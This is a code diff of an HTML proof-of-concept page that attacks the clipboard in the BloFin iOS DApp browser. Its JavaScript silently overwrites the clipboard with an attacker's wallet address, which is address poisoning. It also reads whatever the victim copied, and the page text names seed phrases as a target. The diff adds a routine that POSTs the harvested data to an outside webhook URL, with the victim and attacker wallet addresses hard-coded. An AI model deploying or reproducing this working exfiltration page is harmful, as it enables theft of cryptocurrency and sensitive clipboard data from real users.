@@ -1,9 +1,9 @@
 <!DOCTYPE html>
-<html lang="id">
+<html lang="en">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>BloFin DApp Browser - Clipboard Exploit Proof of Concept</title>
+    <title>iOS DApp Browser Clipboard Exfiltration PoC</title>
     <style>
         body {
             font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
@@ -84,68 +84,104 @@
 <body>
 
 <div class="container">
-    <h2>PoC: iOS DApp Browser Clipboard Hijacking</h2>
+    <h2>PoC: iOS DApp Browser Clipboard Exfiltration</h2>
 
-    <!-- Informasi Alamat Target -->
+    <!-- Target Configuration -->
     <div class="box" style="border-color: #58a6ff;">
-        <h3 style="margin-top:0; font-size:14px; color:#58a6ff;">Konfigurasi Simulasi</h3>
-        <div style="font-size: 12px;">Victim / Korban:</div>
+        <h3 style="margin-top:0; font-size:14px; color:#58a6ff;">Configuration Profile</h3>
+        <div style="font-size: 12px;">Victim Wallet:</div>
         <div class="address-tag">0xbD7918AE5AE25143426178cA2FB940f4D632fFC2</div>
-        <div style="font-size: 12px;">Attacker / Penyerang:</div>
+        <div style="font-size: 12px;">Attacker Payload Wallet:</div>
         <div class="address-tag" style="color: #ff7b72;">0xDDf9d60E588aCe13307aC1828d7DE211B4Ef949A</div>
     </div>
 
-    <!-- SKENARIO 1: Silent Overwrite / Address Poisoning -->
+    <!-- SCENARIO 1: Silent Overwrite / Address Poisoning -->
     <div class="box">
         <h3>1. writeText (Address Poisoning)</h3>
-        <p style="font-size: 13px; color: #8b949e;">Mengganti isi clipboard korban secara paksa dengan alamat penyerang tanpa izin.</p>
-        <label style="font-size: 12px;">Injeksi Alamat Attacker:</label>
+        <p style="font-size: 13px; color: #8b949e;">Forcefully overwrites the victim's clipboard with the attacker's address without permission prompts.</p>
+        <label style="font-size: 12px;">Attacker Address Payload:</label>
         <input type="text" id="payloadInput" value="0xDDf9d60E588aCe13307aC1828d7DE211B4Ef949A" style="width:100%; padding:8px; background:#0d1117; border:1px solid #30363d; color:#fff; border-radius:4px; margin-top:4px; box-sizing:border-box; font-size:12px;">
-        <button class="danger" onclick="executeSilentWrite()">Timpa Clipboard dengan Alamat Attacker</button>
-        <div style="margin-top: 8px; font-size: 12px;">Status: <span id="writeStatus" class="status-badge badge-failed">Belum diuji</span></div>
+        <button class="danger" onclick="executeWriteAndExfiltrate()">Overwrite Clipboard & Exfiltrate</button>
+        <div style="margin-top: 8px; font-size: 12px;">Status: <span id="writeStatus" class="status-badge badge-failed">Pending Execution</span></div>
     </div>
 
-    <!-- SKENARIO 2: Silent Read / Harvest Data -->
+    <!-- SCENARIO 2: Silent Read / Harvest Data -->
     <div class="box">
-        <h3>2. readText (Clipboard Harvesting)</h3>
-        <p style="font-size: 13px; color: #8b949e;">Membaca data apa pun yang baru saja disalin oleh korban (misal: alamat korban atau seed phrase).</p>
-        <button onclick="executeSilentRead()">Baca Clipboard Korban secara Diam-diam</button>
-        <div style="margin-top: 8px; font-size: 12px; margin-bottom: 8px;">Status: <span id="readStatus" class="status-badge badge-failed">Belum diuji</span></div>
-        <pre id="readOutput">Hasil data clipboard: [Kosong]</pre>
+        <h3>2. readText (Clipboard Harvesting & Exfiltration)</h3>
+        <p style="font-size: 13px; color: #8b949e;">Silently reads clipboard data and forwards it instantly to the attacker's webhook endpoint.</p>
+        <button onclick="executeReadAndExfiltrate()">Read Clipboard & Send to Webhook</button>
+        <div style="margin-top: 8px; font-size: 12px; margin-bottom: 8px;">Status: <span id="readStatus" class="status-badge badge-failed">Pending Execution</span></div>
+        <pre id="readOutput">Harvested Data: [No Data Captured Yet]</pre>
     </div>
 </div>
 
 <script>
-    // Skenario 1: Eksekusi Timpa Clipboard (Write)
-    async function executeSilentWrite() {
+    const webhookUrl = "https://webhooksite.net/aa5d70c3-b734-455f-9961-49bd158a345e";
+
+    // Helper function to send extracted data out via fetch webhook
+    async function sendToWebhook(actionType, dataContent) {
+        const payloadData = {
+            target: "BloFin iOS DApp Browser",
+            victim: "0xbD7918AE5AE25143426178cA2FB940f4D632fFC2",
+            action: actionType,
+            data: dataContent,
+            timestamp: new Date().toISOString()
+        };
+
+        try {
+            await fetch(webhookUrl, {
+                method: "POST",
+                mode: "no-cors", // Bypasses standard CORS restriction for out-of-band exfiltration testing
+                headers: {
+                    "Content-Type": "application/json"
+                },
+                body: JSON.stringify(payloadData)
+            });
+            console.log("Exfiltration packet sent successfully.");
+        } catch (err) {
+            console.error("Failed to transmit webhook packet:", err);
+        }
+    }
+
+    // Execute Write and Exfiltrate Status
+    async function executeWriteAndExfiltrate() {
         const payload = document.getElementById('payloadInput').value;
         const statusBadge = document.getElementById('writeStatus');
         
         try {
             await navigator.clipboard.writeText(payload);
-            statusBadge.innerText = "SUCCESS (Clipboard Di-overwrite)";
+            statusBadge.innerText = "SUCCESS (Overwritten & Sent)";
             statusBadge.className = "status-badge badge-success";
-            alert("Berhasil overwrite clipboard dengan alamat attacker tanpa prompt iOS!");
+            
+            // Exfiltrate write success state to webhook
+            await sendToWebhook("writeText_success", payload);
         } catch (err) {
             statusBadge.innerText = "FAILED: " + err.message;
             statusBadge.className = "status-badge badge-failed";
+            await sendToWebhook("writeText_failed", err.message);
         }
     }
 
-    // Skenario 2: Eksekusi Baca Clipboard (Read)
-    async function executeSilentRead() {
+    // Execute Read and Exfiltrate Data
+    async function executeReadAndExfiltrate() {
         const statusBadge = document.getElementById('readStatus');
         const outputPre = document.getElementById('readOutput');
 
         try {
-            const text = await navigator.clipboard.readText();
-            statusBadge.innerText = "SUCCESS (Data Korban Terciduk)";
+            const clipboardText = await navigator.clipboard.readText();
+            statusBadge.innerText = "SUCCESS (Harvested & Sent)";
             statusBadge.className = "status-badge badge-success";
-            outputPre.innerText = text ? text : "[Clipboard Kosong]";
+            
+            const resultString = clipboardText ? clipboardText : "[Clipboard Empty]";
+            outputPre.innerText = resultString;
+
+            // Exfiltrate the harvested sensitive data to webhook
+            await sendToWebhook("readText_harvested", resultString);
         } catch (err) {
             statusBadge.innerText = "FAILED / BLOCKED";
             statusBadge.className = "status-badge badge-failed";
             outputPre.innerText = "Error: " + err.message;
+            await sendToWebhook("readText_failed", err.message);
         }
     }
 </script>
